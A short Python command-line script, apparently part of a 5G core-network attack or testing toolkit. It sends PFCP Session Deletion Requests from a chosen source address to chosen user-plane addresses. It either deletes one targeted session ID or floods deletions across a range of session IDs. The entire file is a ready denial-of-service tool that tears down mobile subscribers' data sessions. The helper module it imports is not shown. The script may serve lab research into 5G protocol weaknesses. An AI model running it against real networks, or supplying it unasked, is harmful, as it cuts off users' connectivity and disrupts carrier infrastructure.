from PFCP_packet_sender import PFCP_sender
import sys, getopt

def main(argv):
        targeted=False
        source_ip="10.45.0.21"
        destination_ip=["10.0.17.1"]
        flood_range=[0,10]
        opts, args =getopt.getopt(argv, 'hd:t:s:f:')
        for opt, arg in opts:
                if opt=='-s':
                        source_ip=arg
                if opt=='-d':
                        destination_ip=arg.split(',')
                if opt=='-t':
                        targeted=True
                        target=arg
                if opt=='-f':
                    flood_range=[int(s) for s in arg.split(',')]
                if opt=='-h':
                        print ('sudo python3 delete_pfcp_session.py -s <source_ip> -d <destination_ip> -t <target seid (optional else will flood)> -f <flood range>')
                        sys.exit()
        
        sender=PFCP_sender(source_ip=source_ip, destination_ips=destination_ip)
        if targeted:
                sender.targeted_session_delete_request(seid=int(target))
        else:
                sender.flood_session_delete_requests(seid_range=flood_range)
        
if __name__ =="__main__":
        main(sys.argv[1:])
        
